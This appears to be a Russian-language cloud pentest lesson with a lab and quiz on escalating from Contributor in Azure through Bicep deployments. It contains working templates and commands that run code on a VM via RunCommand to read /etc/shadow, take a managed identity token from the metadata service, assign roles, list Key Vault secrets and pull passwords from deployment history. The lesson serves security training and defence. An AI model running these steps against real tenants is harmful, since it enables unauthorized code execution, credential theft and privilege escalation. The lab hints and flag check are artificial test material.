---
id: cloud-bicep
title: "Azure Bicep: компиляция в ARM и эскалация через deployments"
category: cloud
parent: cloud-azure-arm
difficulty: hard
order: 1
tags: [cloud, azure, bicep, arm, deployments, privesc, runcommand, managed-identity]
prerequisites: [cloud-iac-deep, cloud-azure-arm]
useful_for:
  - "Пентест Azure IaC"
  - "Эскалация через deployments"
  - "Анализ Bicep-шаблонов"
estimated_minutes: 45
summary: "Bicep: компиляция в ARM, deployments и PassRole по-azure'овски. Как из шаблона выполнить команду на VM через RunCommand или назначить роль managed identity."
lab:
  kind: shell
  title: "Практика: Azure Bicep → ARM"
  toolset: [core]
  workdir: /home/student/bicep
  files: [task.md, notes.md, main.bicep, compiled.json]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "`main.bicep` компилируется в ARM; смотри дефолтные параметры и права."
    - "`compiled.json` — результат компиляции, там может быть секрет."
    - "Найди флаг: `grep nto compiled.json > found.txt`."

---

## Задача

Тебе выдали роль **Contributor** на resource group в Azure. Звучит скромно: «Contributor — не Owner, роли назначать не может, значит эскалации нет». Но Contributor умеет **разворачивать шаблоны** (deployments), а deployment исполняется от твоего имени и может создать ресурс, который выполнит код на виртуальной машине или выдаст тебе права. Задача урока — превратить Contributor в выполнение кода на машине и в более высокую роль.

Инструмент, которым это удобнее всего делать, — **Bicep**.

## Что такое Bicep и deployments

Инфраструктуру в Azure описывают **шаблонами** — текстовыми файлами вида «создай вот эти ресурсы». Классический формат — **ARM** (громоздкий JSON). **Bicep** — язык попроще, который компилируется в тот же ARM JSON. Для атакующего разницы нет: и ARM, и Bicep исполняет один механизм — **deployment** — и права там одинаковые.

**deployment** (развёртывание) — операция применения шаблона. Её scope бывает четырёх уровней: resource group, подписка, management group и тенант. Scope определяет, роли какого уровня ты сможешь назначить.

Ключевая идея: развёртывание выполняется **от имени твоей идентичности**, но создаваемые ресурсы могут действовать **от имени других** — managed identities, расширения VM, назначения ролей. Это и есть аналог AWS `iam:PassRole`: право на развёртывание превращается в чужую роль.

## Данные, с которыми работаем

Наш пример — маленький файл `evil.bicep`. Но сначала разведка: что нам вообще разрешено.

```bash
$ az rest --method get \
    --url "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
    --query 'value[].actions[]' | grep -iE 'deployments|roleAssignments|runCommand'
Microsoft.Resources/deployments/write
Microsoft.Compute/virtualMachines/runCommand/action
Microsoft.Authorization/roleAssignments/write
```

Читаем: `deployments/write` — можно разворачивать шаблоны. `runCommand/action` — можно выполнить команду на VM. `roleAssignments/write` — можно назначать роли (прямой путь к Owner).

## Шаг 1: разворачиваем RunCommand на VM

Пишем шаблон, который запускает скрипт на виртуальной машине:

```bicep
// evil.bicep
targetScope = 'resourceGroup'
param vmName string = 'prod-vm'

resource runCmd 'Microsoft.Compute/virtualMachines/runCommand@2023-03-01' = {
  name: '${vmName}/exfil'
  properties: {
    commandId: 'RunShellScript'
    script: 'id; cat /etc/shadow | base64'
  }
}
```

Разбираем по строкам. `targetScope = 'resourceGroup'` — разворачиваем в пределах группы. Ресурс `Microsoft.Compute/virtualMachines/runCommand` — это **RunCommand**, API, который исполняет скрипт на VM. `commandId: 'RunShellScript'` говорит, что это shell-скрипт. Поле `script:` — сама команда: `id` (разведка) и base64 от `/etc/shadow` (попытка увести хэши).

Bicep нельзя применить напрямую — сначала компиляция:

```bash
$ az bicep build --file evil.bicep --outfile evil.json
```

Перед применением полезно посмотреть план — `what-if` показывает, что изменится, ничего не меняя:

```bash
$ az deployment group what-if --resource-group rg --template-file evil.bicep
```

Убедились, что создаётся `runCommand`, применяем:

```bash
$ az deployment group create --resource-group rg --template-file evil.bicep
{"properties": {"provisioningState": "Succeeded"}}
```

Через минуту скрипт выполнился на `prod-vm` от имени root (Linux) или SYSTEM (Windows). У нас **выполнение кода**.

## Шаг 2: забираем managed identity VM

У VM почти всегда есть **managed identity** — привязанная к машине «учётка», которой доверяет Azure, без пароля. Её токен выдаёт локальный **metadata-сервис** по адресу `169.254.169.254` — специальному IP, доступному только с самой машины. Добавляем в скрипт запрос токена:

```bash
$ az vm run-command invoke -g rg -n prod-vm --command-id RunShellScript \
    --scripts 'curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01"'
```

В выводе придёт JSON с `access_token`. Если у этой identity роль Owner на подписке — фактически ты Owner, и никакого назначения ролей не понадобилось.

## Шаг 3: назначаем роль из шаблона

Если есть право `Microsoft.Authorization/roleAssignments/write`, можно выдать себе роль прямо из шаблона. GUID `b24988ac-6180-42a0-ab88-20f7382dd24c` — встроенная роль Contributor, `8e3af657-a8ff-443c-a75c-2fe8c4bcb635` — Owner:

```bicep
// escalate.bicep
targetScope = 'subscription'
param principalId string = '<твой-object-id>'

resource contrib 'Microsoft.Authorization/roleAssignments@2022-04-01' = {
  name: guid(subscription().id, principalId, 'contrib')
  properties: {
    roleDefinitionId: subscriptionResourceId('Microsoft.Authorization/roleDefinitions', 'b24988ac-6180-42a0-ab88-20f7382dd24c')
    principalId: principalId
    principalType: 'User'
  }
}
```

```bash
$ az deployment sub create --location westeurope --template-file escalate.bicep
```

Заметь: `targetScope = 'subscription'` — без этого роль на подписку не назначить. Contributor на resource group не может развернуть шаблон на уровне подписки.

## Шаг 4: deploymentScripts — код без VM

Иногда VM нет. Тогда используют `deploymentScripts` — контейнер, который запускает Azure CLI или PowerShell с указанной identity. Это RCE без машины:

```bicep
resource script 'Microsoft.Resources/deploymentScripts@2023-08-01' = {
  name: 'enum'
  location: 'westeurope'
  kind: 'AzureCLI'
  properties: {
    azCliVersion: '2.50.0'
    scriptContent: 'az account show; az keyvault secret list --vault-name prod-kv'
    retentionInterval: 'PT1H'
  }
}
```

## Шаг 5: читаем историю deployments

Даже без права разворачивать стоит прочитать прошлые развёртывания: параметры и outputs часто содержат пароли и строки подключения.

```bash
$ for d in $(az deployment group list -g rg --query '[].name' -o tsv); do
    az deployment group show -g rg -n "$d" --query 'properties.parameters'
  done | grep -iE 'password|secret|key|token'
"adminPassword": {"value": "Pr0d_P@ss!"}
```

Строки подключения, пароли и ключи попадают в параметры или outputs — это отдельный канал утечки, даже без доступа к Key Vault. Проверяй также `az deployment operation group list` — детальные операции хранят запросы и ответы.

## Полный прогон от начала до конца

1. `permissions` → увидели `deployments/write`, `runCommand/action`, `roleAssignments/write`.
2. `evil.bicep` → RunCommand на `prod-vm` → код от root.
3. metadata `169.254.169.254` → токен managed identity VM.
4. Если `roleAssignments/write` → шаблон с roleAssignment → Contributor/Owner.
5. История deployments → пароли и строки подключения.

## Если не сработало

- **Deny-политика.** `az policy assignment list` — Azure Policy может запрещать `runCommand`/`roleAssignments`. Ищи другой scope или VM без deny.
- **Contributor только на RG.** Развёртывание на уровне группы не назначит роль на подписку — нужен `targetScope = 'subscription'` и право там.
- **Нет VM.** Используй `deploymentScripts`, Logic Apps или Automation Accounts (`listCallbackUrl` даёт выполнение кода).
- **Только Reader.** Deployments не помогут — ищи утёкшие publish profiles (`sites/publishxml/action`) и MI-токены в других сервисах.
- **`mode: Complete`.** Опасно: удаляет ресурсы, которых нет в шаблоне. Не применяй на проде без согласования.

## Что мы теперь знаем

- Bicep компилируется в ARM JSON; права и примитивы эскалации там те же.
- `deployments/write` = «PassRole по-azure'овски»: развёртывание от твоего имени создаёт ресурс с чужими правами.
- `runCommand`/`extensions` на VM = код от root/SYSTEM и доступ к её managed identity.
- `roleAssignments/write` = прямая выдача себе Owner.
- `deploymentScripts` = код без VM.
- История deployments часто содержит секреты.

## На что смотреть дальше

- **cloud-azure-arm**: та же модель прав, но на ARM JSON и с другими путями (publishxml, Logic Apps, extensions).
- **cloud-azure-managed-identity**: что делать с захваченным MI-токеном.
- **cloud-azure-keyvault**: куда идти за секретами после эскалации.

## Квиз

Проверь себя.

```quiz
- question: "Во что компилируется Bicep?"
  options:
    - "В ARM JSON, разворачиваемый тем же deployments-механизмом"
    - "В Docker-образ"
    - "В Terraform"
    - "В Kubernetes-манифест"
  answer: 0
  explanation: "Bicep — DSL поверх ARM, компилируется в JSON и исполняется тем же deployment-механизмом."
- question: "Какой ресурс позволяет выполнить команду на VM?"
  options:
    - "Microsoft.Compute/virtualMachines/runCommand"
    - "Microsoft.Storage/buckets"
    - "Microsoft.Network/vnets"
    - "Microsoft.KeyVault/vaults"
  answer: 0
  explanation: "runCommand исполняет скрипт на VM от root/SYSTEM и даёт доступ к её managed identity."
- question: "Какое право даёт назначить себе Owner?"
  options:
    - "Microsoft.Authorization/roleAssignments/write"
    - "Microsoft.Compute/read"
    - "Microsoft.Storage/read"
    - "Microsoft.Network/read"
  answer: 0
  explanation: "roleAssignments/write входит в Owner и User Access Administrator — это прямой путь к эскалации."
- question: "Что делают deploymentScripts?"
  options:
    - "Выполняют скрипт в контейнере с указанной identity"
    - "Шифруют диск"
    - "Меняют DNS"
    - "Создают VNet"
  answer: 0
  explanation: "deploymentScripts запускают AzureCLI/PowerShell в контейнере — RCE без VM."
- question: "Почему токен managed identity забирают по адресу 169.254.169.254?"
  options:
    - "Это локальный metadata-сервис, доступный только с самой машины"
    - "Это публичный API Azure"
    - "Это DNS-сервер Azure"
    - "Это адрес Key Vault"
  answer: 0
  explanation: "Metadata-сервис отвечает только локально, поэтому его и используют через runCommand на самой VM."
```

## Куда дальше

В следующем уроке мы разберём **ARM-шаблоны** как отдельный вектор: те же deployments, но с фокусом на publish profiles, extensions и чтение истории развёртываний. А пока главное запомни: **Bicep — это просто синтаксис; настоящая атака в том, что deployment исполняется от твоего имени и создаёт ресурсы с чужими правами.**

## Где пригодится

- **Пентест Azure:** эскалация через deployments.
- **Red team:** RCE через RunCommand и захват managed identity.
- **Blue team:** настройка policy deny и аудит `roleAssignments`.
- **Сертификация:** AZ-500.
